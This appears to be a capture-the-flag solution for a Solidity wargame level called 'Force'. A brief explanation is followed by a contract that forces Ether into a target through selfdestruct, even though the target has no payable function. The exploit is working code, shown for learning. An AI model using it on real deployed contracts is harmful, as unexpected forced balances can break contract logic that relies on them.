The "Force" contract does not have a "payable" function so we cannot transfer any Ether through usual means. We can however create another contract and call the selfdestruct() function that can send Ether to any address regardless of the payable status.

// Send this contract some Ether while deploying
contract Solution
{
    // Make payable to send ether during deployment
    constructor() payable {}
    
    function SendEtherForcefully(address target) external
    {
        // make sender address payable to surrender all Ether after selfdestruct
        selfdestruct(payable(target));
    }
}
